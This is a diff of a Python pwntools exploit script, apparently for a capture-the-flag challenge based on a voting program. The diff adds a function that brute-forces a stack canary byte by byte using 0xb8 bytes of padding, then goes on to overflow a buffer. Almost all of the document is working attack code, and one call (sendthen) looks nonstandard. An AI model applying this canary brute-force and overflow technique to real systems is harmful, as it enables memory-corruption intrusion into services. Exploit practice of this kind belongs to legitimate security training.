@@ -13,7 +13,7 @@ cnt = 0
 def vote():
     # in voting function
     global cnt
-    for do_vote in range(0, 10):
+    for do_vote in xrange(0, 10):
         r.sendlineafter('>', '1')
         # Candidates:
         # print(r.recvline())
@@ -46,13 +46,42 @@ def buf_canary():
     r.sendline('3')
     print(r.recv())
 
-canary = ''
-guess = 0
-def hack_canary():
-    return 0
+def hack_canary_2():
+    canary = ''
+    canary_offset = 0xb8
+    guess = 0x0
+
+    buf = ''
+    buf += 'A' * canary_offset
+
+    while len(canary) < 8:
+        while guess <= 0xff:
+
+            r.send('1')
+            r.sendthen('Token: ', buf + chr(guess))
+
+            check = r.recv()
+            print('try canary --> ', hex(guess), check)
+            if 'Invalid' not in check:
+                print('Correct canary byte --> ', format(guess, '02x'))
+                canary += chr(guess)
+                buf += chr(guess)
+                guess = 0
+                break
+
+            r.send('2')
+            r.sendthen('token: ', buf + chr(guess))
+            print('Done --> ', r.recv())
+            guess += 1
+            #pause()
+
+    print('Canary --> ', hexdump(canary))
 
 def main():
-    for token_cnt in range(0, 25):
+    # brute force finding canary
+    hack_canary_2()
+    # vote for writing more buffer
+    for token_cnt in xrange(0, 25):
         r.sendlineafter('>', '2')
         r.sendlineafter('token: ', token[token_cnt])
         r.sendlineafter('>', '1')
